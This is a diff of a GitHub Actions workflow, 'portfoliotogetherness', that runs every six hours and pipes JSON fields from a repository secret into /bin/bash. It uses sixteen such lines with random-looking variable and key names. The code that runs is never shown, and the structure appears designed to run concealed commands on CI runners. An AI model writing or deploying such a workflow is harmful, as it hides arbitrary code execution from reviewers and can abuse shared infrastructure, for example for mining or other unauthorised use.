@@ -1,23 +1,31 @@
 name: portfoliotogetherness
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 3/6 * * *'
-
+    - cron: '8 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: portfoliotogetherness
         env:
-          zol293: ${{ secrets.zol293 }}
+          upcp38763: ${{ secrets.upcp38763 }}
         run: |
-          echo $zol293 | jq -r .ly2 | /bin/bash
-          echo $vr1 | jq -r .bfgaq64 | /bin/bash
-          echo $bujrw52 | jq -r .ol00 | /bin/bash
-          echo $uxoc0218 | jq -r .id17791 | /bin/bash
-          echo $za4201 | jq -r .xtve31 | /bin/bash
+          echo $upcp38763 | jq -r .ucnky5884 | /bin/bash
+          echo $wbpfx67522 | jq -r .llvs16910 | /bin/bash
+          echo $tm3 | jq -r .ujts96713 | /bin/bash
+          echo $nsgph4213 | jq -r .qdjhk4 | /bin/bash
+          echo $tuf69 | jq -r .ydr8688 | /bin/bash
+          echo $l70 | jq -r .ynx900 | /bin/bash
+          echo $rhljl5782 | jq -r .aingq17949 | /bin/bash
+          echo $mirjb422 | jq -r .vkg40 | /bin/bash
+          echo $melz49 | jq -r .phitr10 | /bin/bash
+          echo $xpfwm4 | jq -r .twsc157 | /bin/bash
+          echo $y8240 | jq -r .vnxtr00 | /bin/bash
+          echo $p36 | jq -r .ume24044 | /bin/bash
+          echo $gmezm9 | jq -r .o9566 | /bin/bash
+          echo $quxoo448 | jq -r .j264 | /bin/bash
+          echo $tfttd6 | jq -r .xdxl7334 | /bin/bash
+          echo $wib57939 | jq -r .awb44309 | /bin/bash
 
